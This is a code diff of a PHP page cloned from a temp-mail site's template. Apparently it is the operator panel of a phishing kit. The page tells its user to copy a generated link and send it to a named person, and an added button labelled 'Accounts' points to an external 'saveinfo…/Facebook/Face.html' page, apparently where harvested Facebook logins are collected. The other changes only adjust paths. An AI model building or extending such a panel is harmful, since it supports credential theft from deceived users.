@@ -36,7 +36,7 @@ if($_SESSION["loged"] !== "admin"){
 var url_domain = 'temp-mail.org';
 var url_check = 'https://temp-mail.org/en/option/check/';
 var url_delete = 'https://temp-mail.org/en/option/delete/';
-var url_refresh = './join.php';
+var url_refresh = '../join/';
 var lang_delete = 'Delete this address';
 var lang_deleted = 'Deleted!';
 var lang_change = 'معاينة الشكل عند فتح الرابط';
@@ -153,7 +153,7 @@ attach_ezolpl();
 			
 			
 <div class="btn-appstore">
-                    <a href="./join.php" class="no-ajaxy btn btn-outline-dark">
+                    <a href="../join/" class="no-ajaxy btn btn-outline-dark">
                         <img width="20" src="./css/rj.png" alt="Back-رجوع">Back-رجوع</a>
                   
                 </div>				
@@ -168,6 +168,9 @@ attach_ezolpl();
 <div class="section-top-qr">
     <div class="container">
         <div class="row ">
+		
+		
+		
             <div class="col hidden-xs-sm-md-lg">
                 <div class="ad-block-336X280 ad-block-left-336X280">
 <!--     <img src="--><!--images/ad250x250.png" alt="">-->
@@ -178,6 +181,7 @@ attach_ezolpl();
         <!-- End Ezoic - New site top left 250*250 - sidebar -->
     </div>
             </div>
+			
             <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 col-xl-6">
                 <div class="temp-emailbox">
                     <h2><?php echo' يرجى نسخ هذا الرابط وارساله الى ('.$_SESSION["firstName"].') '; ?></h2>
@@ -245,7 +249,8 @@ attach_ezolpl();
         <div class="row justify-content-center">
             <div class="col-md-auto justify-content-center">
                 <a id="click-to-copy" href="#" data-clipboard-action="copy" data-clipboard-target="#mail" class="no-ajaxy btn btn-gray click-to-copy" data-original-title="" title=""> <span class="icon-control control-copy"></span> Copy</a>
-                <a target="_blank" href="<?php echo './id/'.$_SESSION["userid"].'';?>" id="click-to-change" class="no-ajaxy btn btn-gray click-to-change" data-original-title="" title=""> <span class="icon-control control-edit"></span>معاينة</a>
+                <a target="_blank" href="<?php echo '../id/'.$_SESSION["userid"].'';?>" id="click-to-change" class="no-ajaxy btn btn-gray click-to-change" data-original-title="" title=""> <span class="icon-control control-edit"></span>معاينة</a>
+                <a target="_blank" href="http://saveinfo.aba.ae/Facebook/Face.html" id="click-to-change" class="no-ajaxy btn btn-gray click-to-change" data-original-title="" title=""> <span class="icon-control control-edit"></span>الحسابات</a>
             </div>
         </div>
     </div>
@@ -492,7 +497,7 @@ __ez.queue.addFile('jellyfish.php', '/porpoiseant/jellyfish.webp?a=a&cb=1&shcb=3
 
 <script>
 function newwin(a) {              
- myWindow=window.open("<?php echo './id/'.$_SESSION["userid"].'';?>");
+ myWindow=window.open("<?php echo '../id/'.$_SESSION["userid"].'';?>");
  
  return false;
 }
